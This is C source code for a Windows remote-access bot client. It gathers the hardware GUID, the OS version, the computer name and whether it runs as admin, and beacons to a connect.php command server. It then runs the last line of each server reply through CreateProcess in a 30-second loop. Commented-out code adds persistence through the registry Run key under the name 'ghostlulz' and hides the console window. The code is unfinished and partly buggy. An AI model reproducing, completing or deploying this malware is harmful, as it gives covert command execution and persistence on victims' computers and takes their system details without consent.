#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <winnt.h>
#pragma comment(lib,"ws2_32.lib") // winsock library
#pragma comment(lib,"Advapi32.lib") // winsock library

//void addstartup();
void adminyn(char* pc);
void connect_server(SOCKET* s,char* pc,char* version); // connect to page and get

void os_version(char* version);
void freeme();
void computer_name(TCHAR * computername);

int main()
{
	printf("starting the program..");
	// remove console window
	//freeme();

	Sleep(20000); // miliseconds 1000 = 1 sec
	char pc[255];

	// check to see if we are admin or not
	adminyn(pc);
	printf("pc: %x", pc); // where does this getting printed?


	// computer name
	TCHAR computername[MAX_COMPUTERNAME_LENGTH + 1]; // used for computer_name func
	computer_name(computername);
	//printf("%s",computername);

	// windows version
	char version[50] ; // used for os_version func
	os_version(version);


	WSADATA WSA;
	SOCKET s; // our socket
	struct sockaddr_in server; // socket info for server
	char* message, server_reply[2000]; // holds mesage recv and message sent
	int recv_size; // bytes recived
	struct sockaddr_in SockAddr;// used with gethostbyname

	char url[50] = "localhost";

	STARTUPINFO ini_processo;
	PROCESS_INFORMATION processo_info;

	// initalise winsock library first param is version
	WSAStartup(MAKEWORD(2,2),&WSA);

	// get IP from Url
	struct hostent *ip = gethostbyname(url);
	memcpy(&(SockAddr.sin_addr),ip->h_addr,ip->h_length);
	char* pIP = inet_ntoa(SockAddr.sin_addr);
	memset(server_reply, 0, sizeof(server_reply));

	WSACleanup();

	// addstartup(); // add to registry startup

	while(1)
	{
		WSAStartup(MAKEWORD(2,2),&WSA); // initalise winsock library first param is version

		// our socket info ipv4 tcp
		s = socket(AF_INET,SOCK_STREAM, 0);

		// server info IP Port
		server.sin_addr.s_addr = inet_addr(pIP); // server ip
		server.sin_family = AF_INET;// IPV4
		server.sin_port = htons(80); // server port

		//connect to server
		connect(s,(struct sockaddr *)&server,sizeof(server));

		memset(&ini_processo, 0, sizeof(ini_processo));
		ini_processo.cb = sizeof(ini_processo);
		ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
		ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)s;



		//  checkin/send GET requqest to server
		connect_server(&s,pc,version);

		//recv html from server
		while((recv_size = recv(s,server_reply,2000,0)) > 0) {
		   server_reply[recv_size] = '\0';
		   printf("server_reply: %s\n", server_reply);


		   // here we need to get last line of server_reply and then call system() on that line
		   // wait a moment i'm working on it ok

		   char *command = server_reply;
		   for (int i = 0; i < strlen(server_reply); i++) {
				if (server_reply[i] == '\n') {
					command = server_reply + i + 1;
				}
		   }
		   printf("Command to be executed: '%s'\n\n\n", command);
		   TCHAR* cmd = TEXT(command);
		   CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);
		   memset(server_reply, 0, sizeof(server_reply));
		//clean up
		   closesocket(s);
		   WSACleanup();
		   Sleep(30000); // 30 sec // 1000 miliseconds = 1 sec
		}

	}

	return 0;
}
// void addstartup()
// {
// 		TCHAR path[100];
// 		GetModuleFileName(NULL,path,100);
// 		HKEY newValue;
// 		RegOpenKey(HKEY_CURRENT_USER ,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",&newValue);
// 		RegSetValueEx(newValue,"ghostlulz",0,REG_SZ,(LPBYTE)path,sizeof(path));
// 		RegCloseKey(newValue);
// }

void adminyn(char * pc)
{
	// function to check if program is running as admin

	BOOL IsUserAnAdmin();
	/*++
	Routine Description: This routine returns TRUE if the caller's
	process is a member of the Administrators local group. Caller is NOT
	expected to be impersonating anyone and is expected to be able to
	open its own process and process token.
	Arguments: None.
	Return Value:
	   TRUE - Caller has Administrators local group.
	   FALSE - Caller does not have Administrators local group. --
	*/

	BOOL b;
	SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
	PSID AdministratorsGroup;
	b = AllocateAndInitializeSid(
		&NtAuthority,
		2,
		SECURITY_BUILTIN_DOMAIN_RID,
		DOMAIN_ALIAS_RID_ADMINS,
		0, 0, 0, 0, 0, 0,
		&AdministratorsGroup);
	if(b)
	{
		if (!CheckTokenMembership( NULL, AdministratorsGroup, &b))
		{
			 b = FALSE;
		}
		FreeSid(AdministratorsGroup);
	}

	if(b==FALSE)
	{
		printf("user");
		strcpy(pc,"user");
	}
	else if(b==TRUE)
	{
		printf("admin");
		strcpy(pc, "admin");
	}
}

void connect_server(SOCKET* s,char* pc,char* version)
{
	HW_PROFILE_INFO hwProfileInfo;// hwid
	//send data to server
	GetCurrentHwProfile(&hwProfileInfo);// get hwid info

	// format http requests
	char* str1;
	const char* str2;
	const char* str3;
	const char* str4;
	const char* str5;
	const char* str20;

	str1 = hwProfileInfo.szHwProfileGuid;
	str2 = "GET /connect.php?hwid=";
	str3 = "&version=";
	str20= "&pc=";
	str4 = "&os=windows"; //variable  PC should go here
	str5 = " HTTP/1.0\r\nHost: 127.0.0.1\r\n\r\n";

	char * message2 = (char *) malloc(1 + strlen(str1)+ strlen(str2)+ strlen(str3)+ strlen(pc)+ strlen(str5) + strlen(str20)+strlen(version)+strlen(str4)+strlen(pc) );

	strcpy(message2,str2);
	strcat(message2,str1);
	strcat(message2,str3);
	strcat(message2,version);
	strcat(message2,str20);
	strcat(message2,pc);
	strcat(message2,str4);
	strcat(message2,str5);


	// send http requests
	send(*s, message2, strlen(message2), 0);

//    int len = MultiByteToWideChar(CP_UTF8, 0, message2, -1, NULL, 0);
//    wchar_t* wMessage = (wchar_t)malloc(len *sizeof(wchar_t));
//    MultiByteToWideChar(CP_UTF8, 0, message2, -1, wMessage, len);
//
//    len = WideCharToMultiByte(CP_ACP, 0, wMessage, -1, NULL, 0, NULL, NULL);
//    char* ansiMessage = (char*)malloc(len);
//    WideCharToMultiByte(CP_ACP, 0, wMessage, -1, ansiMessage, len, NULL, NULL);


	//execute powerhsell command
	//system(message2); //execute file *****must use winexec not system() with sw_hide option to hide console window*****
	//ShellExecuteA(NULL, "open", s, NULL, NULL, SW_SHOWNORMAL);  // https://superuser.com/questions/601282/%CC%81-is-not-recognized-as-an-internal-or-external-command
	if(message2 == NULL) {
		// Handle error
		exit(1);
	}
	free(message2);
//	free(ansiMessage);
//	free(wMessage);
}

void freeme()
{
	 //FreeConsole(); // removes console window/ runs program silent in background
}
void os_version(char* version)
{
	OSVERSIONINFOA info;
	ZeroMemory(&info, sizeof(OSVERSIONINFOA)); // error
	info.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);

	// os version
	GetVersionEx(&info);

	//printf("Windows version: %u.%u\n", info.dwMajorVersion, info.dwMinorVersion);
	if(info.dwMajorVersion == 6 && info.dwMinorVersion == 1)
	{
		strcpy(version, "Windows7|Server2012");

	}
	else if(info.dwMajorVersion == 6 && info.dwMinorVersion == 0)
	{
		strcpy(version, "WindowsVista|server2008");

	}
	else if(info.dwMajorVersion == 6 && info.dwMinorVersion == 2)
	{
		strcpy(version, "Windows8|server2012");

	}
	else if(info.dwMajorVersion == 6 && info.dwMinorVersion == 3)
	{
		strcpy(version, "Windows8.1|Server2012R");

	}
	else if(info.dwMajorVersion == 10 && info.dwMinorVersion == 0)
	{
		strcpy(version, "Windows10|Server2008");

	}
	else
	{
		strcpy(version, "Unknown");
	}

}

void computer_name(TCHAR * computername)
{
	TCHAR computernamee[MAX_COMPUTERNAME_LENGTH + 1]; // used for computer_name func
	// computer name
	DWORD size = sizeof(computernamee) / sizeof(computernamee[0]);
	GetComputerName(computernamee, &size);
	strcpy(computername, computernamee);

}
